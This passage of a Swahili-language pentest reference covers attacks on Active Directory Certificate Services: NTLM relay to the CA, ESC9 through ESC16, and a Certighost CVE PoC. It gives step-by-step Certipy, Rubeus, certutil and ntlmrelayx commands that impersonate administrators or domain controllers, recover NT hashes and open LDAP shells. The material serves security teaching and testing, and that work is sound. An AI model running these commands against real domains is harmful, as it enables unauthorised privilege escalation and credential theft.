Ombi la cheti hutumwa na Certipy kwa chaguo-msingi kwa kutumia template `Machine` au `User`, kulingana na ikiwa jina la account inayorelayiwa linaishia na `$`. Kutaja template mbadala kunawezekana kwa kutumia parameter `-template`.

Technique kama [PetitPotam](https://github.com/ly4k/PetitPotam) inaweza kutumiwa kulazimisha authentication. Unaposhughulika na domain controllers, ni lazima utaje `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Maelezo

Thamani mpya **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) ya **`msPKI-Enrollment-Flag`**, inayorejelewa kama ESC9, huzuia kuingizwa kwa **new `szOID_NTDS_CA_SECURITY_EXT` security extension** kwenye certificate. Flag hii huwa muhimu wakati `StrongCertificateBindingEnforcement` imewekwa kuwa `1` (setting ya default), tofauti na setting ya `2`. Umuhimu wake huongezeka katika hali ambapo certificate mapping dhaifu kwa Kerberos au Schannel inaweza kutumiwa (kama ilivyo kwenye ESC10), kwa kuwa kutokuwepo kwa ESC9 hakutabadilisha mahitaji.

Masharti ambayo setting ya flag hii huwa muhimu ni pamoja na:

- `StrongCertificateBindingEnforcement` haijawekwa kuwa `2` (default ikiwa `1`), au `CertificateMappingMethods` inajumuisha flag ya `UPN`.
- Certificate imewekewa flag ya `CT_FLAG_NO_SECURITY_EXTENSION` ndani ya setting ya `msPKI-Enrollment-Flag`.
- Client authentication EKU yoyote imeainishwa na certificate.
- Ruhusa za `GenericWrite` zinapatikana kwenye account yoyote ili ku-compromise nyingine.

### Mfano wa Matumizi Mabaya

Tuchukulie `John@corp.local` ana ruhusa za `GenericWrite` kwenye `Jane@corp.local`, akiwa na lengo la ku-compromise `Administrator@corp.local`. Template ya certificate ya `ESC9`, ambayo `Jane@corp.local` ameruhusiwa ku-enroll, imewekwa flag ya `CT_FLAG_NO_SECURITY_EXTENSION` katika setting yake ya `msPKI-Enrollment-Flag`.

Mwanzoni, hash ya `Jane` inapatikana kwa kutumia Shadow Credentials, kutokana na `GenericWrite` ya `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Baadaye, `userPrincipalName` ya `Jane` inabadilishwa kuwa `Administrator`, huku sehemu ya domain ya `@corp.local` ikiachwa kwa makusudi:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Marekebisho haya hayakiuki vikwazo, kwa kuwa `Administrator@corp.local` bado ni tofauti kama `userPrincipalName` ya `Administrator`.

Baada ya hayo, certificate template ya `ESC9`, iliyoainishwa kuwa vulnerable, inaombwa kama `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Imebainika kuwa `userPrincipalName` ya certificate inaonyesha `Administrator`, bila “object SID” yoyote.

`userPrincipalName` ya `Jane` kisha inarejeshwa kuwa ya awali, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Kujaribu authentication kwa kutumia certificate iliyotolewa sasa kunatoa NT hash ya `Administrator@corp.local`. Amri lazima ijumuishe `-domain <domain>` kwa sababu certificate haina maelezo ya domain:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Weak Certificate Mappings - ESC10

### Explanation

Thamani mbili za funguo za registry kwenye domain controller zinarejelewa na ESC10:

- Thamani chaguo-msingi ya `CertificateMappingMethods` chini ya `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` ni `0x18` (`0x8 | 0x10`), ambayo hapo awali ilikuwa `0x1F`.
- Mpangilio chaguo-msingi wa `StrongCertificateBindingEnforcement` chini ya `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` ni `1`, ambao hapo awali ulikuwa `0`.

**Kesi ya 1**

Wakati `StrongCertificateBindingEnforcement` imesanidiwa kuwa `0`.

**Kesi ya 2**

Ikiwa `CertificateMappingMethods` inajumuisha bit ya `UPN` (`0x4`).

### Abuse Case 1

`StrongCertificateBindingEnforcement` ikiwa imesanidiwa kuwa `0`, account A yenye ruhusa za `GenericWrite` inaweza kutumiwa vibaya ku-compromise account yoyote B.

Kwa mfano, akiwa na ruhusa za `GenericWrite` juu ya `Jane@corp.local`, attacker analenga ku-compromise `Administrator@corp.local`. Utaratibu huu unafanana na ESC9, hivyo kuruhusu certificate template yoyote kutumiwa.

Kwanza, hash ya `Jane` inapatikana kwa kutumia Shadow Credentials, kwa kutumia vibaya `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Baadaye, `userPrincipalName` ya `Jane` inabadilishwa kuwa `Administrator`, huku sehemu ya `@corp.local` ikiachwa kwa makusudi ili kuepuka ukiukaji wa kizuizi.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Kufuatia hili, certificate inayowezesha client authentication inaombwa kama `Jane`, kwa kutumia template chaguo-msingi ya `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` ya `Jane` kisha inarejeshwa kwenye thamani yake ya awali, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Kuthibitisha utambulisho kwa kutumia certificate iliyopatikana kutatoa NT hash ya `Administrator@corp.local`, hivyo domain lazima ibainishwe kwenye command kwa sababu certificate haina maelezo ya domain.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Kesi ya Matumizi Mabaya 2

Kwa `CertificateMappingMethods` iliyo na bit flag ya `UPN` (`0x4`), account A yenye ruhusa za `GenericWrite` inaweza ku-compromise account yoyote B isiyo na property ya `userPrincipalName`, ikijumuisha machine accounts na built-in domain administrator `Administrator`.

Hapa, lengo ni ku-compromise `DC$@corp.local`, tukianza kwa kupata hash ya `Jane` kupitia Shadow Credentials, kwa kutumia `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`userPrincipalName` ya `Jane` huwekwa kuwa `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Cheti cha uthibitishaji wa mteja kinaombwa kama `Jane` kwa kutumia template ya `User` ya chaguomsingi.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` ya `Jane` inarejeshwa kuwa ya awali baada ya mchakato huu.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Ili kufanya authenticate kupitia Schannel, chaguo la Certipy `-ldap-shell` linatumika, likionyesha kufanikiwa kwa authentication kama `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Kupitia LDAP shell, commands kama `set_rbcd` huwezesha mashambulizi ya Resource-Based Constrained Delegation (RBCD), ambayo yanaweza kuhatarisha domain controller.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Athari hii pia huathiri akaunti yoyote ya mtumiaji isiyo na `userPrincipalName` au ambayo hailingani na `sAMAccountName`, huku `Administrator@corp.local` ya kawaida ikiwa lengo kuu kutokana na LDAP privileges zake za juu na kutokuwepo kwa `userPrincipalName` kwa default.

## Relaying NTLM to ICPR - ESC11

### Maelezo

Ikiwa CA Server haijasanidiwa na `IF_ENFORCEENCRYPTICERTREQUEST`, inaweza kuruhusu NTLM relay attacks bila signing kupitia RPC service. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Unaweza kutumia `certipy` ku-enumerate ikiwa `Enforce Encryption for Requests` imezimwa, na certipy itaonyesha Vulnerabilities za `ESC11`.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Hali ya Matumizi Mabaya

Inahitaji kusanidi relay server:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Kumbuka: Kwa domain controllers, lazima tubainishe `-template` katika DomainController.

Au kwa kutumia fork ya impacket ya sploutchy:
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Maelezo

Administrators wanaweza kusanidi Certificate Authority ili kuihifadhi kwenye kifaa cha nje kama vile "Yubico YubiHSM2".

Ikiwa kifaa cha USB kimeunganishwa kwenye CA server kupitia porti ya USB, au kupitia USB device server iwapo CA server ni virtual machine, authentication key (ambayo wakati mwingine huitwa "password") inahitajika kwa Key Storage Provider ili kuzalisha na kutumia keys kwenye YubiHSM.

Key/password hii imehifadhiwa kwenye registry chini ya `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` katika cleartext.

Reference in [hapa](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Scenario ya Abuse

Ikiwa private key ya CA imehifadhiwa kwenye kifaa halisi cha USB unapopata shell access, inawezekana kurecover key.

Kwanza, unahitaji kupata certificate ya CA (hii ni public), kisha:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Hatimaye, tumia amri ya certutil `-sign` kuunda certificate mpya ya kiholela kwa kutumia certificate ya CA na private key yake.

## OID Group Link Abuse - ESC13

### Maelezo

Sifa ya `msPKI-Certificate-Policy` inaruhusu issuance policy kuongezwa kwenye certificate template. Objects za `msPKI-Enterprise-Oid` zinazohusika na kutoa policies zinaweza kugunduliwa katika Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) ya PKI OID container. Policy inaweza kuunganishwa na AD group kwa kutumia sifa ya object's `msDS-OIDToGroupLink`, hivyo kuwezesha mfumo kumuidhinisha mtumiaji anayewasilisha certificate kana kwamba alikuwa mwanachama wa group. [Rejeleo hapa](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

Kwa maneno mengine, mtumiaji anapokuwa na ruhusa ya ku-enroll certificate na certificate hiyo imeunganishwa na OID group, mtumiaji anaweza kurithi privileges za group hiyo.

Tumia [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) kupata OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Scenario ya Abuse

Tafuta permission ya user kwa kutumia `certipy find` au `Certify.exe find /showAllPermissions`.

Ikiwa `John` ana permission ya ku-enroll `VulnerableTemplate`, user anaweza kurithi privileges za group `VulnerableGroup`.

Anachohitaji kufanya ni kubainisha template; atapata certificate yenye rights za OIDToGroupLink.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Vulnerable Certificate Renewal Configuration- ESC14

### Maelezo

Maelezo katika https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping ni ya kina sana. Hapa chini kuna nukuu ya maandishi asilia.

ESC14 inahusu vulnerabilities zinazotokana na "weak explicit certificate mapping", hasa kupitia matumizi mabaya au configuration isiyo salama ya attribute ya `altSecurityIdentities` kwenye akaunti za mtumiaji au computer za Active Directory. Attribute hii yenye thamani nyingi inawaruhusu administrators kuhusisha manually certificates za X.509 na akaunti ya AD kwa madhumuni ya authentication. Inapojazwa, mappings hizi za wazi zinaweza kubatilisha certificate mapping logic ya kawaida, ambayo kwa kawaida hutegemea UPNs au majina ya DNS katika SAN ya certificate, au SID iliyowekwa kwenye security extension ya `szOID_NTDS_CA_SECURITY_EXT`.

Mapping ya "weak" hutokea wakati string value inayotumika ndani ya attribute ya `altSecurityIdentities` kutambua certificate ni pana kupita kiasi, ni rahisi kukisia, inategemea certificate fields zisizo za kipekee, au inatumia certificate components zinazoweza spoof kwa urahisi. Ikiwa attacker anaweza kupata au kutengeneza certificate ambayo attributes zake zinaendana na explicit mapping dhaifu iliyofafanuliwa kwa akaunti yenye privileges, anaweza kutumia certificate hiyo ku-authenticate kama akaunti hiyo na ku-impersonate.

Mifano ya `altSecurityIdentities` mapping strings ambazo zinaweza kuwa dhaifu ni pamoja na:

- Ku-map kwa kutumia Subject Common Name (CN) ya kawaida pekee: kwa mfano, `X509:<S>CN=SomeUser`. Attacker anaweza kupata certificate yenye CN hii kutoka kwenye source isiyo salama.
- Kutumia Issuer Distinguished Names (DNs) au Subject DNs za jumla kupita kiasi bila qualification zaidi kama serial number maalum au subject key identifier: kwa mfano, `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Kutumia patterns nyingine zinazotabirika au identifiers zisizo za cryptographic ambazo attacker anaweza kuzitimiza katika certificate anayoweza kuipata au ku-forge kihalali (ikiwa amesha-compromise CA au amepata template yenye vulnerability kama ESC1).

Attribute ya `altSecurityIdentities` inasaidia formats mbalimbali za mapping, kama vile:

- `X509:<I>IssuerDN<S>SubjectDN` (hu-map kwa kutumia Issuer na Subject DN kamili)
- `X509:<SKI>SubjectKeyIdentifier` (hu-map kwa kutumia thamani ya Subject Key Identifier extension ya certificate)
- `X509:<SR>SerialNumberBackedByIssuerDN` (hu-map kwa kutumia serial number, ambayo inahitimu implicitly na Issuer DN) - hii si format ya standard, kwa kawaida huwa `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (hu-map kwa kutumia RFC822 name, kwa kawaida email address, kutoka SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (hu-map kwa kutumia SHA1 hash ya raw public key ya certificate - kwa ujumla ni strong)

Usalama wa mappings hizi unategemea sana specificity, uniqueness, na cryptographic strength ya certificate identifiers zilizochaguliwa na kutumika katika mapping string. Hata ikiwa strong certificate binding modes zimewashwa kwenye Domain Controllers (ambazo huathiri hasa implicit mappings kulingana na SAN UPNs/DNS na SID extension), entry ya `altSecurityIdentities` iliyosanidiwa vibaya bado inaweza kutoa njia ya moja kwa moja ya impersonation ikiwa mapping logic yenyewe ina dosari au inaruhusu kupita kiasi.
### Abuse Scenario

ESC14 inalenga **explicit certificate mappings** katika Active Directory (AD), hasa attribute ya `altSecurityIdentities`. Ikiwa attribute hii imewekwa (kwa design au kutokana na misconfiguration), attackers wanaweza ku-impersonate akaunti kwa kuwasilisha certificates zinazolingana na mapping.

#### Scenario A: Attacker Can Write to `altSecurityIdentities`

**Precondition**: Attacker ana write permissions kwenye attribute ya `altSecurityIdentities` ya akaunti inayolengwa, au ana permission ya kuipatia kupitia moja ya permissions zifuatazo kwenye target AD object:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.
#### Scenario B: Target Has Weak Mapping via X509RFC822 (Email)

- **Precondition**: Target ina X509RFC822 mapping dhaifu katika altSecurityIdentities. Attacker anaweza kuweka attribute ya mail ya victim ilingane na X509RFC822 name ya target, ku-enroll certificate kama victim, na kuitumia ku-authenticate kama target.
#### Scenario C: Target Has X509IssuerSubject Mapping

- **Precondition**: Target ina weak X509IssuerSubject explicit mapping katika `altSecurityIdentities`.Attacker anaweza kuweka attribute ya `cn` au `dNSHostName` kwenye victim principal ilingane na subject ya X509IssuerSubject mapping ya target. Kisha, attacker anaweza ku-enroll certificate kama victim, na kutumia certificate hiyo ku-authenticate kama target.
#### Scenario D: Target Has X509SubjectOnly Mapping

- **Precondition**: Target ina weak X509SubjectOnly explicit mapping katika `altSecurityIdentities`. Attacker anaweza kuweka attribute ya `cn` au `dNSHostName` kwenye victim principal ilingane na subject ya X509SubjectOnly mapping ya target. Kisha, attacker anaweza ku-enroll certificate kama victim, na kutumia certificate hiyo ku-authenticate kama target.
### concrete operations
#### Scenario A

Request a certificate of the certificate template `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Hifadhi na ubadilishe cheti
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Thibitisha utambulisho (kwa kutumia certificate)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Usafishaji (hiari)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Kwa mbinu mahususi zaidi za mashambulizi katika hali mbalimbali za mashambulizi, tafadhali rejelea yafuatayo: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Maelezo

Maelezo katika https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc ni ya kina sana. Hapa chini kuna nukuu kutoka kwenye maandishi asilia.

Kwa kutumia built-in default version 1 certificate templates, mshambuliaji anaweza kuunda CSR ili kujumuisha application policies ambazo zinapendelewa kuliko sifa za Extended Key Usage zilizosanidiwa kwenye template. Sharti pekee ni kuwa na enrollment rights, na inaweza kutumika kutengeneza client authentication, certificate request agent, na codesigning certificates kwa kutumia template ya **_WebServer_**

### Matumizi Mabaya

Yafuatayo yamerejelewa kwenye [kiungo hiki]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),Bofya ili kuona mbinu za matumizi zenye maelezo zaidi.


Amri ya `find` ya Certipy inaweza kusaidia kutambua V1 templates ambazo huenda zikaathiriwa na ESC15 ikiwa CA haijapigwa patch.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scenario A: Direct Impersonation kupitia Schannel

**Hatua ya 1: Omba certificate, ukiingiza Application Policy ya "Client Authentication" na UPN ya mlengwa.** Attacker `attacker@corp.local` anam­lenga `administrator@corp.local` kwa kutumia template ya "WebServer" V1 (ambayo inaruhusu subject kutolewa na enrollee).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Template ya V1 iliyo hatarini yenye "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Huongeza OID `1.3.6.1.5.5.7.3.2` kwenye extension ya Application Policies ya CSR.
- `-upn 'administrator@corp.local'`: Huweka UPN kwenye SAN kwa ajili ya impersonation.

**Hatua ya 2: Authenticate kupitia Schannel (LDAPS) kwa kutumia certificate iliyopatikana.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Scenario B: PKINIT/Kerberos Impersonation kupitia Enrollment Agent Abuse

**Hatua ya 1: Omba certificate kutoka kwenye V1 template (iliyo na "Enrollee supplies subject"), ukiingiza "Certificate Request Agent" Application Policy.** Certificate hii ni ya attacker (`attacker@corp.local`) ili awe enrollment agent. Hakuna UPN iliyobainishwa kwa utambulisho binafsi wa attacker hapa, kwa kuwa lengo ni kupata uwezo wa agent.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Huongeza OID `1.3.6.1.4.1.311.20.2.1`.

**Hatua ya 2: Tumia certificate ya "agent" kuomba certificate kwa niaba ya target privileged user.** Hii ni hatua inayofanana na ESC3, ikitumia certificate kutoka Hatua ya 1 kama certificate ya agent.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Hatua ya 3: Thibitisha utambulisho kama mtumiaji mwenye marupurupu ukitumia certificate ya "on-behalf-of".**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Security Extension Disabled on CA (Globally)-ESC16

### Maelezo

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** inarejelea hali ambapo, ikiwa usanidi wa AD CS haulazimishi kujumuishwa kwa extension ya **szOID_NTDS_CA_SECURITY_EXT** katika certificates zote, attacker anaweza kutumia udhaifu huu kwa:

1. Kuomba certificate **bila SID binding**.

2. Kutumia certificate hii **kwa authentication kama account yoyote**, kwa mfano kujiigiza kama account yenye privileges za juu (k.m., Domain Administrator).

Unaweza pia kurejelea article hii ili kujifunza zaidi kuhusu kanuni hiyo kwa undani:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Abuse

Ifuatayo imerejelewa kwenye [kiungo hiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally),Bofya ili kuona mbinu za matumizi kwa undani zaidi.

Ili kubaini ikiwa mazingira ya Active Directory Certificate Services (AD CS) yako katika hatari ya **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Hatua ya 1: Soma UPN ya awali ya akaunti ya mwathiriwa (Si lazima - kwa urejeshaji).
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Hatua ya 2: Sasisha UPN ya akaunti ya mwathiriwa iwe `sAMAccountName` ya msimamizi lengwa.
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Hatua ya 3: (Ikiwa inahitajika) Pata credentials za akaunti ya "victim" (kwa mfano, kupitia Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Hatua ya 4: Omba certificate kama mtumiaji "mwathiriwa" kutoka kwa _client authentication template_ yoyote inayofaa (kwa mfano, "User") kwenye CA iliyo katika hatari ya ESC16.** Kwa sababu CA iko katika hatari ya ESC16, itaondoa kiotomatiki SID security extension kutoka kwenye certificate iliyotolewa, bila kujali mipangilio mahususi ya template kuhusu extension hii. Weka environment variable ya Kerberos credential cache (shell command):
```bash
export KRB5CCNAME=victim.ccache
```
Kisha omba cheti:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Hatua ya 5: Rejesha UPN ya akaunti ya "victim".**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Hatua ya 6: Thibitisha utambulisho wako kama msimamizi anayelengwa.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### Maelezo

**Certighost** inatumia vibaya **AD CS enrollment chase / callback path** ambapo CA inaamini request attributes zilizotolewa na requester ili kutambua identity inayopaswa kuwekwa kwenye certificate iliyotolewa. Kwenye public PoC, request iliyoundwa mahsusi inajumuisha:

- **`cdc`**: host/IP inayodhibitiwa na attacker ambayo CA itawasiliana nayo
- **`rmd`**: **jina la DNS la Domain Controller inayolengwa** la kuigiza

Ikiwa CA itafuata chase hiyo, itaunganishwa na attacker kupitia **SMB/LSA (`445`)** na **LDAP (`389`)**. Attacker anatumia **akaunti halisi ya mashine** (kwa kawaida huundwa kupitia **`ms-DS-MachineAccountQuota`** ya default) ili callback session ithibitishe kama domain principal halali, lakini rogue services zinarudisha attributes za identity ya **target DC** badala yake:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Ikiwa CA **haifungi identity iliyorejeshwa kwa njia ya cryptographic na callback principal iliyothibitishwa**, inaweza kutoa certificate ya **Domain Controller** ingawa session ilithibitishwa kama machine account inayodhibitiwa na attacker. Hii inafanya bug hii kuwa tofauti kimawazo na **Certifried**: badala ya kuandika upya AD attributes kama `dNSHostName`, attacker **anabadilisha identity data wakati wa CA callback resolution**.

**Masharti muhimu:**

- **domain credentials** zenye privileges ndogo
- Uwezo wa **kuunda au kutumia tena computer account**
- Network reachability kutoka kwa **CA** hadi **ports `389` na `445`** zinazodhibitiwa na attacker
- Vulnerable / unpatched CA request path (update ya Microsoft ya **July 14, 2026** iliongeza **DC validation kwa `cdc`** pamoja na **resolved-SID comparison**)

**`.pfx`** inayopatikana inaweza kutumiwa kwa **PKINIT**, na kutoa **`.ccache`** pamoja na, katika published PoC flow, **target DC NT hash**, ambayo kwa kawaida inatosha kwa **full domain compromise**.

### Matumizi

Public PoC ina-automate chain nzima:

1. Kuunda au kutumia tena **machine account** inayodhibitiwa na attacker.
2. Kuanzisha **rogue LDAP na SMB/LSA listeners** kwenye `389` na `445`.
3. Kutuma certificate request yenye attributes za **`cdc`** inayodhibitiwa na attacker na **`rmd`** ya target.
4. Kuiacha CA ithibitishe kwa rogue listeners kama machine account inayodhibitiwa, lakini kujibu identity lookups kwa attributes za **target DC**.
5. Kupokea **DC certificate** iliyosainiwa na CA, kisha kuitumia kwa **PKINIT**.
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
Useful runtime flags from the PoC:

- `--listener <ip>`: chagua waziwazi IP ya callback inayotangazwa katika `cdc`
- `--computer-name <NAME$>`: tumia tena machine account iliyopo badala ya kuunda mpya

**Vidokezo vya kiutendaji:**

- PoC inahitaji **root** kwa sababu inafunga **privileged ports** `389` na `445`.
- Exploitation iliyofanikiwa huandika **DC `.pfx`** na **Kerberos `.ccache`** ndani ya mfumo.
- Kwa kuwa certificate inaunganishwa na **Domain Controller account**, hatua zinazofuata zinaweza kujumuisha **certificate-based Kerberos auth**, **DCSync**, na kutumia tena **machine NT hash** iliyopatikana.

## Kuhatarisha Forests kwa kutumia Certificates kwa Maelezo ya Passive Voice

### Kuvunjwa kwa Forest Trusts kupitia CAs Zilizoathiriwa

Usanidi wa **cross-forest enrollment** hufanywa kuwa rahisi kwa kiasi. **Root CA certificate** kutoka resource forest **huchapishwa kwenye account forests** na administrators, na certificates za **enterprise CA** kutoka resource forest **huongezwa kwenye `NTAuthCertificates` na AIA containers katika kila account forest**. Kwa ufafanuzi, mpangilio huu huipa **CA katika resource forest udhibiti kamili** juu ya forests nyingine zote ambazo PKI inasimamia. CA hii **ikivamiwa na attackers**, certificates za users wote katika resource na account forests zinaweza **kughushiwa nao**, na hivyo kuvunja security boundary ya forest.

### Enrollment Privileges Zinazopewa Foreign Principals

